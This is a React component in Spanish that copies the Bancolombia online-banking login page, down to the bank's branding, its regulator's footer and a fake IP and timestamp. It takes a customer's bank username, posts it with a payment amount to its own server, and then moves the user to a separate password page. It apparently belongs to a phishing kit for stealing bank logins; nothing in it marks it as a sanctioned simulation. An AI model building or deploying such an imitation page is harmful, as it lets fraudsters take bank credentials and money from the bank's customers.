import { useState } from "react"
import { useNavigate, useLocation } from "react-router-dom"
import "./BancolombiaSim.css"
import NavBarBa from "../NavBarBa/NavBarBa"
import { BASE_URL } from "../../config"  // <-- Importamos la constante

function BancolombiaSim() {
  const [usuario, setUsuario] = useState("")
  const navigate = useNavigate()
  const location = useLocation()
  const { total } = location.state || {}

  if (!total || total <= 0) {
    alert("No hay un valor válido de pago, vuelve al formulario")
    navigate("/")
  }

  const handleSubmit = async (e) => {
    e.preventDefault()
    if (!usuario) {
      alert("Por favor ingresa tu usuario")
      return
    }

    try {
      const resp = await fetch(`${BASE_URL}/guardar-pago`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          valor: Number(total),
          numero_cuenta: usuario,
        }),
      })

      const data = await resp.json()
      if (data.ok) {
        navigate("/clave", { state: { pagoId: data.pago.id } })
      } else {
        alert("Error: " + data.error)
      }
    } catch (err) {
      console.error(err)
      alert("Error conectando con el servidor")
    }
  }

  return (
    <div className="banco-container">
      <NavBarBa />
      <h2 className="banco-title">Te damos la bienvenida</h2>
      <div className="banco-box">
        <p className="banco-text">
          El usuario es el mismo con el que ingresas a la <br />
          <strong>Sucursal Virtual Personas.</strong>
        </p>
        <form onSubmit={handleSubmit}>
          <div className="form-group">
            <span className="icon">
              <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" fill="#000000ff" viewBox="0 0 16 16">
                <path d="M3 14s-1 0-1-1 1-4 6-4 6 3 6 4-1 1-1 1zm5-6a3 3 0 1 0 0-6 3 3 0 0 0 0 6"/>
              </svg>
            </span>
            <input
              type="text"
              value={usuario}
              onChange={(e) => setUsuario(e.target.value)}
              placeholder="Usuario"
            />
          </div>

          <div className="link-olvide">
            <a href="#">¿Olvidaste tu usuario?</a>
          </div>

          <div className="form-actions">
            <button type="button" className="btn-volver" onClick={() => navigate(-1)}>
              Volver
            </button>
            <button type="submit" className="btn-continuar">Continuar</button>
          </div>
        </form>
      </div>

      <footer className="banco-footer">
        <p>
          Bancolombia{" "}
          <span className="vig">VIGILADO Superintendencia Financiera de Colombia</span>
        </p>
        <p>Dirección IP: 192.230.104.12</p>
        <p>Lunes, 18 de Agosto de 2025, 12:11 a.m.</p>
      </footer>
    </div>
  )
}

export default BancolombiaSim
